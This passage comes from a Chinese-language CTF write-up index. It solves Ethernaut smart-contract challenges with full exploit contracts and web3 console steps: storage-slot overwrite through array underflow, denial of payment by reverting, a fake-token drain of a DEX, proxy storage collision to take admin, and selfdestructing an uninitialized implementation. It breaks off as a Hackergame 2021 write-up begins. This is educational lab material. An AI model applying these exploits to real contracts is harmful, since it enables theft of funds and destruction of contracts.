"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.5.0;\n\nimport '../helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable {\n\n    bool public contact;\n    bytes32[] public codex;\n\n    modifier contacted() {\n        assert(contact);\n        _;\n    }\n\n    function make_contact() public {\n        contact = true;\n    }\n\n    function record(bytes32 _content) contacted public {\n        codex.push(_content);\n    }\n\n    function retract() contacted public {\n        codex.length--;\n    }\n\n    function revise(uint i, bytes32 _content) contacted public {\n        codex[i] = _content;\n    }\n}\n</code></pre> <p>\u8981\u6c42\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u8fd9\u4e2a owner \u7684\u5b58\u50a8\u662f\u5728 Ownable \u4e2d\u5b9a\u4e49\u7684\uff0c\u5b83\u4f1a\u548c contact \u4e00\u8d77\u653e\u5728 storage \u7684 slot 0 \u5904\uff0c\u76ee\u7684\u5c31\u662f\u6539\u53d8\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u503c</p> <p>\u800c slot 1 \u7684\u4f4d\u7f6e\u5f00\u59cb\u5c31\u662f codex \u7684\u5b58\u50a8\uff0c\u5148\u662f\u957f\u5ea6\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 retract() \u51fd\u6570\u6765\u4f7f length \u5411\u4e0b\u6ea2\u51fa\u53d8\u6210 2**256-1\uff0c\u4e5f\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5168\u90e8\u7684 storage \u533a\u57df\uff0c\u6240\u4ee5\u5c31\u53ea\u9700\u8981\u627e\u5230 slot 0 \u5bf9\u5e94\u7684 codex[i] \u7684 i</p> <p>\u56e0\u4e3a codex[i] \u5b9e\u9645\u4e0a\u662f\u8868\u793a keccak256(slot of codex) + i \u5904\uff0c\u6240\u4ee5\u53ea\u8981\u4ee4 i = 2**256 - keccak256(slot of codex) \u5c31\u53ef\u4ee5\u4f7f\u5176\u53d8\u4e3a 2**256\uff0c\u5373\u6ea2\u51fa\u5230 0 \u7684\u4f4d\u7f6e</p> <p>\u800c codex \u7684 slot \u5c31\u662f 1\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97 2**256 - keccak256(1): <pre><code>contract Exploit {\n    function calc() public view returns (bytes32) {\n        return keccak256(abi.encode(bytes32(uint(1))));\n    }\n}\n</code></pre> \u5f97\u5230 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\uff0c\u7528 2**256 \u51cf\u53bb\u5b83\u5f97\u5230 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</p> <p>\u7136\u540e\u66f4\u6539\u8fd9\u4e2a\u4f4d\u7f6e\u5230 player \u5730\u5740\u5c31\u597d\u4e86\uff08\u8981\u5728\u5730\u5740\u524d\u9762\u8865\u4e0a\u4e00\u5806 0 \u548c contact\uff09 <pre><code>&gt; contract.retract()\n&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n&gt; contract.revise(\"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\", \"0x000000000000000000000001&lt;player address&gt;\")\n</code></pre></p>"}, {"location": "writeups/ethernaut/#denial", "title": "Denial", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Denial {\n\n    using SafeMath for uint256;\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address payable public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public {\n        uint amountToSend = address(this).balance.div(100);\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call{value:amountToSend}(\"\");\n        owner.transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = now;\n        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);\n    }\n\n    // allow deposit of funds\n    receive() external payable {}\n\n    // convenience function\n    function contractBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n</code></pre> <p>\u76ee\u7684\u662f\u8981\u963b\u6b62 owner \u5728 withdraw \u7684\u65f6\u5019\u63d0\u53d6\u5230\u8d44\u4ea7</p> <p>\u91cd\u5165\u653b\u51fb\u6ca1\u6709\u6253\u51fa\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u8ba9\u653b\u51fb\u5408\u7ea6\u7684 fallback \u89e6\u53d1 assert \u5f02\u5e38\uff0c\u8fd9\u6837\u6d88\u8017\u6389\u6240\u6709\u7684 gas \u540e\u5c31\u518d\u6ca1\u6cd5\u6b63\u5e38\u5411 owner \u8f6c\u8d26\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Denial */\n\ncontract Exploit {\n    Denial challenge;\n    constructor(address payable addr) public {\n        challenge = Denial(addr);\n    }\n    function exp() public {\n        challenge.setWithdrawPartner(address(this));\n        challenge.withdraw();\n    }\n    receive() external payable {\n        assert(false);\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#shop", "title": "Shop", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ninterface Buyer {\n    function price() external view returns (uint);\n}\n\ncontract Shop {\n    uint public price = 100;\n    bool public isSold;\n\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n\n        if (_buyer.price() &gt;= price &amp;&amp; !isSold) {\n            isSold = true;\n            price = _buyer.price();\n        }\n    }\n}\n</code></pre> <p>\u76ee\u7684\u662f\u4f7f price \u5c0f\u4e8e 100\u3002\u548c Elevator \u7c7b\u4f3c\uff0c\u53ea\u8981\u4f7f\u4e24\u6b21\u8c03\u7528 price \u5f97\u5230\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u53ef\u4ee5\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Shop */\n\ncontract Exploit {\n    Shop challenge;\n    constructor(address addr) public {\n        challenge = Shop(addr);\n    }\n    function price() external view returns (uint) {\n        if (challenge.isSold()) {\n            return 90;\n        }\n        return 100;\n    }\n    function exp() public {\n        challenge.buy();\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#dex-dex-two", "title": "Dex &amp; Dex Two", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Dex {\n    using SafeMath for uint;\n    address public token1;\n    address public token2;\n    constructor(address _token1, address _token2) public {\n        token1 = _token1;\n        token2 = _token2;\n    }\n\n    function swap(address from, address to, uint amount) public {\n        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, \"Not enough to swap\");\n        uint swap_amount = get_swap_price(from, to, amount);\n        IERC20(from).transferFrom(msg.sender, address(this), amount);\n        IERC20(to).approve(address(this), swap_amount);\n        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);\n    }\n\n    function add_liquidity(address token_address, uint amount) public{\n        IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n    }\n\n    function get_swap_price(address from, address to, uint amount) public view returns(uint){\n        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n    }\n\n    function approve(address spender, uint amount) public {\n        SwappableToken(token1).approve(spender, amount);\n        SwappableToken(token2).approve(spender, amount);\n    }\n\n    function balanceOf(address token, address account) public view returns (uint){\n        return IERC20(token).balanceOf(account);\n    }\n}\n\ncontract SwappableToken is ERC20 {\n    constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n    }\n}\n</code></pre> <p>\u9898\u610f\u5c31\u662f\u73a9\u5bb6\u8d26\u6237\u4e0a\u7684 token1 \u548c token2 \u90fd\u5404\u6709 10 \u4e2a token\uff0c\u800c\u9898\u76ee\u8d26\u6237\u4e0a\u6709 100 \u4e2a\uff0c\u76ee\u7684\u662f\u628a\u9898\u76ee\u8d26\u6237\u4e0a\u7684\u67d0\u4e2a token \u6e05\u96f6</p> <p>\u9898\u76ee\u7684 Dex \u5408\u7ea6\u4e3b\u8981\u63d0\u4f9b\u4e86 swap \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5728\u4e24\u4e2a token \u95f4\u4ea4\u6362\u91d1\u989d\u3002\u4f46\u662f\u8f6c\u51fa\u7684\u65f6\u5019\u5148\u8c03\u7528\u4e86 get_swap_price \u6765\u8ba1\u7b97\u91d1\u989d\uff0c\u800c\u4e14\u5728\u5176\u4e2d\u8c03\u7528\u7684\u662f\u4e24\u65b9\u683c\u5b50\u7684 balanceOf \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u65b0\u7684 IERC20 \u7684 token\uff0c\u8ba9\u5b83\u7684 balanceOf \u59cb\u7ec8\u8fd4\u56de 1\uff0c\u4f5c\u4e3a\u5206\u6bcd\uff0c\u8fd9\u6837\u8f6c\u51fa\u7684\u65f6\u5019\u5c31\u4f1a\u8f6c\u51fa\u9898\u76ee token \u4e2d\u7684\u6240\u6709\u4f59\u989d\u4e86</p> <p>Dex Two \u548c Dex \u5dee\u522b\u5c31\u5728\u4e8e DexTwo \u9700\u8981\u5c06\u4e24\u4e2a token \u90fd\u7f6e\u4e3a 0\uff0c\u7528 exp \u51fd\u6570\u5206\u522b\u6253\u4e0b token1 \u548c token2 \u5c31\u884c</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Dex */\n\ncontract ExploitToken {\n    function balanceOf(address account) public view returns (uint256) {\n        return 1;\n    }\n    function transferFrom(address, address, uint256) public returns (bool) {\n        return true;\n    }\n}\n\ncontract Exploit {\n    address token = address(new ExploitToken());\n    Dex challenge;\n    constructor(address addr) public {\n        challenge = Dex(addr);\n    }\n    function exp(address token1) public {\n        challenge.swap(token, token1, 1);\n    }\n}\n</code></pre>"}, {"location": "writeups/ethernaut/#puzzle-wallet", "title": "Puzzle Wallet", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\npragma experimental ABIEncoderV2;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\";\n\ncontract PuzzleProxy is UpgradeableProxy {\n    address public pendingAdmin;\n    address public admin;\n\n    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {\n        admin = _admin;\n    }\n\n    modifier onlyAdmin {\n        require(msg.sender == admin, \"Caller is not the admin\");\n        _;\n    }\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {\n        require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");\n        admin = pendingAdmin;\n    }\n\n    function upgradeTo(address _newImplementation) external onlyAdmin {\n        _upgradeTo(_newImplementation);\n    }\n}\n\ncontract PuzzleWallet {\n    using SafeMath for uint256;\n    address public owner;\n    uint256 public maxBalance;\n    mapping(address =&gt; bool) public whitelisted;\n    mapping(address =&gt; uint256) public balances;\n\n    function init(uint256 _maxBalance) public {\n        require(maxBalance == 0, \"Already initialized\");\n        maxBalance = _maxBalance;\n        owner = msg.sender;\n    }\n\n    modifier onlyWhitelisted {\n        require(whitelisted[msg.sender], \"Not whitelisted\");\n        _;\n    }\n\n    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n        require(address(this).balance == 0, \"Contract balance is not 0\");\n        maxBalance = _maxBalance;\n    }\n\n    function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        whitelisted[addr] = true;\n    }\n\n    function deposit() external payable onlyWhitelisted {\n        require(address(this).balance &lt;= maxBalance, \"Max balance reached\");\n        balances[msg.sender] = balances[msg.sender].add(msg.value);\n    }\n\n    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {\n        require(balances[msg.sender] &gt;= value, \"Insufficient balance\");\n        balances[msg.sender] = balances[msg.sender].sub(value);\n        (bool success, ) = to.call{ value: value }(data);\n        require(success, \"Execution failed\");\n    }\n\n    function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n        bool depositCalled = false;\n        for (uint256 i = 0; i &lt; data.length; i++) {\n            bytes memory _data = data[i];\n            bytes4 selector;\n            assembly {\n                selector := mload(add(_data, 32))\n            }\n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n</code></pre> <p>\u9898\u76ee\u6bd4\u8f83\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u4f7f PuzzleProxy \u7684 admin \u4e3a player</p> <p>\u56e0\u4e3a PuzzleProxy \u548c PuzzleWallet \u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u5b83\u4eec\u7684 storage \u4f1a\u5171\u7528\uff0c\u6240\u4ee5\u5c31\u5bfc\u81f4\u4e86 PuzzleProxy \u7684 pendingAdmin \u5bf9\u5e94\u4e86 PuzzleWallet \u7684 owner\uff0cPuzzleWallet \u7684 maxBalance \u5bf9\u5e94\u4e86 PuzzleProxy \u7684 admin</p> <p>\u4ece\u540e\u5f80\u524d\u63a8\uff1a</p> <ul> <li>\u8981\u4f7f admin \u53d8\u4e3a player\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e3a player</li> <li>\u800c setMaxBalance \u51fd\u6570\u9700\u8981\u5148\u4f7f\u5f53\u524d\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u53d8\u4e3a 0</li> <li>\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u51cf\u5c11\u7684\u65b9\u5f0f\u5728 execute \u4e2d\u7684 call\uff0c\u4f7f\u4f59\u989d\u51cf\u5c11 value</li> <li>\u4f46\u8fd9\u6837\u8981\u4f7f balances[player] &gt;= value</li> <li>\u800c\u901a\u8fc7 deposit \u589e\u52a0 balances[player] \u7684\u8bdd\uff0c\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u4e5f\u4f1a\u540c\u6b65\u589e\u52a0</li> <li>\u6240\u4ee5\u8981\u4f7f\u7528 multicall \u51fd\u6570\u6765\u4f7f balances[player] \u589e\u52a0\u91cf\u4e3a\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u589e\u52a0\u91cf\u7684\u4e8c\u500d</li> <li>\u4f46\u662f multicall \u4e2d\u68c0\u6d4b\u4e86 selector \u4f7f deposit \u53ea\u80fd\u8c03\u7528\u4e00\u6b21</li> <li>\u8fd9\u53ef\u4ee5\u901a\u8fc7 multicall \u4e2d\u6267\u884c\u4e24\u4e2a multicall\uff0c\u6bcf\u4e2a multicall \u8c03\u7528\u4e00\u6b21 deposit</li> </ul> <p>\u8fd9\u6837\u5206\u6790\u4e4b\u540e\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff0c\u9996\u5148\u8c03\u7528 proposeNewAdmin \u6765\u4f7f pendingAdmin\uff08owner\uff09\u53d8\u4e3a player\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u5408\u7ea6\u7684\u65b9\u5f0f\u8c03\u7528 <pre><code>&gt; await web3.eth.getStorageAt(instance, 0)  // owner\n'0x000000000000000000000000&lt;level address&gt;'\n&gt; web3.utils.sha3(\"proposeNewAdmin(address)\").slice(0, 10)  // selector\n'0xa6376746'\n&gt; data = web3.utils.sha3(\"proposeNewAdmin(address)\").slice(0, 10) + player.slice(2).padStart(64, \"0\")\n'0xa6376746000000000000000000000000&lt;player address&gt;'\n&gt; web3.eth.sendTransaction({from: player, to: instance, data: data})\n&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000000&lt;player address&gt;'\n</code></pre></p> <p>\u7136\u540e\u62ff\u5230 owner \u540e\u9700\u8981\u5c06\u81ea\u5df1\u52a0\u5165\u767d\u540d\u5355\uff0c\u5e76\u4e14\u5148\u67e5\u8be2\u4e00\u4e0b\u5408\u7ea6\u8d26\u6237\u4f59\u989d <pre><code>&gt; await contract.addToWhitelist(player)\n&gt; await getBalance(instance)\n'0.001'\n</code></pre></p> <p>\u6240\u4ee5\u9700\u8981\u6784\u9020\u4e00\u4e2a calldata\uff0c\u5b83\u4f1a\u901a\u8fc7 multicall \u8c03\u7528 deposit\uff0c\u7136\u540e\u628a\u4e24\u4e2a\u8fd9\u4e2a calldata \u4f20\u5165 multicall\uff0c\u540c\u65f6\u9644\u5e26 value 0.001 ether\uff0c\u8fd9\u6837 balances[player] \u5c31\u4f1a\u589e\u52a0 0.002 ether\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 execute \u76f4\u63a5\u63d0\u53d6\u51fa\u8fd9 0.002 ether</p> <p>\u63d0\u53d6\u540e\u5408\u7ea6\u8d26\u6237\u7684 balance \u53d8\u4e3a 0\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e86 <pre><code>&gt; web3.utils.sha3(\"deposit()\").slice(0, 10) // deposit selector\n'0xd0e30db0'\n&gt; data = (await contract.methods[\"multicall(bytes[])\"].request([\"0xd0e30db0\"])).data // \u6784\u9020\u901a\u8fc7 multicall \u8c03\u7528 deposit \u7684 calldata\n'0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'\n&gt; await contract.multicall([data, data], {value: toWei(\"0.001\")})\n&gt; await getBalance(instance)\n'0.002'\n&gt; contract.execute(player, toWei(\"0.002\"), 0\n&gt; await getBalance(instance)\n'0'\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0x000000000000000000000000&lt;level address&gt;'\n&gt; contract.setMaxBalance(player)\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0x000000000000000000000000&lt;player address&gt;'\n</code></pre></p>"}, {"location": "writeups/ethernaut/#motorbike", "title": "Motorbike", "text": "\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity &lt;0.7.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/Initializable.sol\";\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) public {\n        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success,) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`. \n    // Will run if no other function in the contract matches the call data\n    fallback () external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r_slot := slot\n        }\n    }\n}\n\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length &gt; 0) {\n            (bool success,) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n\n        AddressSlot storage r;\n        assembly {\n            r_slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n</code></pre> <p>\u540c\u6837\u6709\u4e9b\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u8981\u9500\u6bc1\u6389 Engine</p> <p>\u56e0\u4e3a\u6574\u4e2a\u5408\u7ea6\u4e2d\u90fd\u6ca1\u6709 selfdestruct\uff0c\u6240\u4ee5\u8981\u8f7d\u5165\u81ea\u5df1\u7684\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7 upgradeToAndCall \u51fd\u6570\u6765\u8f7d\u5165\u5408\u7ea6\u5e76\u8c03\u7528\uff0c\u8fd9\u9700\u8981\u901a\u8fc7 _authorizeUpgrade \u51fd\u6570\u7684\u68c0\u67e5\uff0c\u4e5f\u5c31\u662f\u68c0\u67e5 sender \u662f\u5426\u662f upgrader\uff0c\u800c\u6539\u53d8 upgrader \u53ef\u4ee5\u901a\u8fc7 initialize \u51fd\u6570\u6765\u5b8c\u6210</p> <p>\u6240\u4ee5\u653b\u51fb\u6d41\u7a0b\u5c31\u662f\u5148\u901a\u8fc7 getStorageAt \u6765\u5f97\u5230\u90e8\u7f72\u7684 Engine \u7684\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528 initialize\uff0cupgradeToAndCall \u4e00\u4e2a\u90e8\u7f72\u7684\u65b0\u5408\u7ea6\uff0c\u8ba9\u5b83\u89e6\u53d1 selfdestruct \u5c31\u597d\u4e86</p> <p>\u65b0\u5408\u7ea6\uff1a <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    function exp() public {\n        selfdestruct(payable(0));\n    }\n}\n</code></pre></p> <p>\u653b\u51fb\u6d41\u7a0b\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\")\n'0x000000000000000000000000&lt;engine address&gt;'\n&gt; engine = \"0x&lt;engine address&gt;\"\n&gt; data = web3.utils.sha3(\"initialize()\").slice(0, 10)\n'0x8129fc1c'\n&gt; web3.eth.sendTransaction({from: player, to: engine, data: data})\n&gt; await web3.eth.call({from: player, to: engine, data: web3.utils.sha3(\"upgrader()\").slice(0, 10)}) // \u9a8c\u8bc1 upgrader\n'0x000000000000000000000000&lt;player address&gt;'\n&gt; exp = \"&lt;Exploit contract address&gt;\"\n&gt; expdata = web3.utils.sha3(\"exp()\").slice(0, 10)\n'0xab60ffda'\n&gt; signature = {\n    name: 'upgradeToAndCall',\n    type: 'function',\n    inputs: [\n        {\n            type: 'address',\n            name: 'newImplementation'\n        },\n        {\n            type: 'bytes memory',\n            name: 'data'\n        }\n    ]\n}\n{name: 'upgradeToAndCall', type: 'function', inputs: Array(2)}\n&gt; data = web3.eth.abi.encodeFunctionCall(upgradeSignature, [exp, expdata])\n'0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000'\n&gt; web3.eth.sendTransaction({from: player, to: engine, data: data})\n</code></pre></p>"}, {"location": "writeups/hackergame2021/", "title": "Hackergame 2021 Writeup", "text": "<p> \u7ea6 9370 \u4e2a\u5b57  286 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 35 \u5206\u949f</p> <p>Abstract</p> <p>\u53c2\u52a0\u7684\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u7b97\u662f CTF \u7684\u6bd4\u8d5b\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1ahttps://blog.tonycrane.cc/p/c05d7b7c.html</p> <p>\u5b98\u65b9 writeup</p>"}, {"location": "writeups/hackergame2021/#_1", "title": "\u7b7e\u5230", "text": "<p>\u4e3a\u4e86\u80fd\u8ba9\u5927\u5bb6\u987a\u5229\u7b7e\u5230\uff0c\u547d\u9898\u7ec4\u628a\u6bcf\u4e00\u79d2\u7684 flag \u90fd\u8bb0\u5f55\u4e0b\u6765\u5236\u6210\u4e86\u65e5\u8bb0\u672c\u7684\u4e00\u9875\u3002\u4f60\u53ea\u9700\u8981\u6253\u5f00\u65e5\u8bb0\uff0c\u7ffb\u5230 Hackergame 2021 \u6bd4\u8d5b\u8fdb\u884c\u671f\u95f4\u7684\u4efb\u4f55\u4e00\u9875\u5c31\u80fd\u5f97\u5230 flag\uff01</p> <p>\u5f88\u660e\u786e\uff0c\u8fdb\u5165\u7f51\u5740\u540e\u4e00\u76f4\u70b9 Next \u7ffb\u5230\u6bd4\u8d5b\u65f6\u95f4\u5c31\u597d\u4e86\uff08\u8bef</p> <p>\u770b\u5230\u4e86 URI \u91cc\u6709 <code>?page=...</code>\uff0c\u6240\u4ee5\u4e5f\u61d2\u5f97\u8ba1\u7b97\u4e86\uff0c\u624b\u52a8\u4e8c\u5206\uff0c\u5927\u6982 <code>?page=1635000000</code> \u5de6\u53f3\u5c31\u53ef\u4ee5\u770b\u5230 flag \u4e86</p> <p>\u8d5b\u540e\u624d\u53cd\u5e94\u8fc7\u6765\u539f\u6765\u662f UNIX \u65f6\u95f4\u6233</p>"}, {"location": "writeups/hackergame2021/#_2", "title": "\u8fdb\u5236\u5341\u516d\u2014\u2014\u53c2\u4e0a", "text": "<p> \u4e5f\u5f88\u660e\u786e\uff0c\u76f4\u63a5\u628a\u53f3\u4fa7\u6321\u4f4f\u7684 flag \u90e8\u5206\u5bf9\u5e94\u5de6\u8fb9\u7684\u5341\u516d\u8fdb\u5236\u6570\u6362\u7b97\u6210\u5341\u8fdb\u5236\uff0c\u7136\u540e\u6839\u636e ASCII \u7801\u8f6c\u6210\u5b57\u7b26\u3002\u6216\u8005\u76f4\u63a5\u628a\u5de6\u4fa7\u6284\u8fdb Hex Friend \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u53f3\u4fa7\u7684flag\u3002</p> <p>\uff08**\u5f53\u65f6\u8fd9\u9898\u6284\u4e32\u884c\u4e86\u4e24\u4e09\u6b21\u2026\u2026\uff09</p>"}, {"location": "writeups/hackergame2021/#_3", "title": "\u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2", "text": "<p>\u5f53\u7136\uff0c\u5982\u679c\u53ea\u662f\u8fd9\u6837\u8fd8\u8fdc\u8fdc\u4e0d\u591f\u3002\u9075\u4f9d\u53f2\u79f0\u201c\u8001\u7239\u201d\u7684\u4e0a\u53e4\u5148\u8d24\u7684\u81f3\u7406\u540d\u8a00\uff0c\u5fc5\u987b\u8981\u201c\u7528\u9b54\u6cd5\u6253\u8d25\u9b54\u6cd5\u201d\u3002X \u540c\u5b66\u5411\u4e0a\u7ea7\u7533\u8bf7\u5230\u4e86\u79d1\u5927\u897f\u533a\u540c\u6b65\u8f90\u5c04\u5b9e\u9a8c\u5ba4\u8bbe\u5907\u7684\u4f7f\u7528\u6743\u9650\uff0c\u4ee5\u6b64\u6253\u901a\u6b21\u5143\u7a7a\u95f4\uff0c\u501f\u52a9\u5230\u53e6\u4e00\u4e2a\u5e73\u884c\u5b87\u5b99\u4e2d Z \u540c\u5b66\u7684\u6cd5\u529b\u8fdb\u884c\u6570\u636e\u5bf9\u51b2\uff0c\u65b9\u624d\u4e8e\u4e71\u4e2d\u640f\u5f97\u4e00\u4e1d\u673a\u4f1a\uff0c\u5c06 flag 